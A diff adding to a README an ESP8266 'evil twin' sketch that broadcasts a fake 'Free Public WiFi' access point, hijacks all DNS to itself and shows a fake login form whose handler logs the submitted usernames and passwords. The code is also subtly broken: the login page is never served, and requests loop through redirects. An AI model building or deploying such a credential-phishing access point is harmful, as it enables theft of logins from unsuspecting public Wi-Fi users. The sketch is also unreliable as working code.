@@ -1,5 +1,105 @@
 # Evil-Twin_Node_MCU
 
+```bash
+#include <ESP8266WiFi.h>
+#include <DNSServer.h>
+#include <ESP8266WebServer.h>
+
+// Configuration
+const char* AP_SSID = "Free Public WiFi";  // Fake AP name
+const char* REDIRECT_URL = "http://login.required";  // Phishing URL
+
+const byte DNS_PORT = 53;
+IPAddress apIP(192, 168, 1, 1);
+DNSServer dnsServer;
+ESP8266WebServer webServer(80);
+
+// HTML for captive portal
+const char* loginPage = 
+R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+<title>Network Login Required</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #f0f0f0; }
+  .container { background: white; width: 300px; margin: 100px auto; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+  input { width: 100%; padding: 10px; margin: 8px 0; box-sizing: border-box; }
+  button { background: #4CAF50; color: white; padding: 14px 20px; border: none; cursor: pointer; width: 100%; }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Network Login</h2>
+  <p>Enter credentials to access Internet</p>
+  <form action="/login" method="POST">
+    <input type="text" name="username" placeholder="Username" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit">Login</button>
+  </form>
+</div>
+</body>
+</html>
+)rawliteral";
+
+void setup() {
+  Serial.begin(115200);
+  
+  // Configure AP
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(AP_SSID);
+
+  // Start DNS server (captive portal)
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  // Web server handlers
+  webServer.on("/", handleRoot);
+  webServer.on("/login", handleLogin);
+  webServer.onNotFound(handleRoot);  // Redirect all requests
+  webServer.begin();
+
+  Serial.println("\nEvil Twin AP Running!");
+  Serial.print("SSID: ");
+  Serial.println(AP_SSID);
+  Serial.print("IP: ");
+  Serial.println(apIP);
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  webServer.handleClient();
+}
+
+// Handle captive portal redirect
+void handleRoot() {
+  webServer.sendHeader("Location", REDIRECT_URL, true);
+  webServer.send(302, "text/plain", "");
+}
+
+// Process captured credentials
+void handleLogin() {
+  String username = webServer.arg("username");
+  String password = webServer.arg("password");
+  
+  Serial.println("\n[+] Credentials Captured!");
+  Serial.print("Username: ");
+  Serial.println(username);
+  Serial.print("Password: ");
+  Serial.println(password);
+
+  // Redirect after capture
+  webServer.sendHeader("Location", "http://example.com", true);
+  webServer.send(302, "text/plain", "Login Successful");
+}
+
+// Not needed but included for clarity
+void handleNotFound() {
+  handleRoot();
+}
+```
+
+
 ## Key Components
 
 **Fake Access Point:**
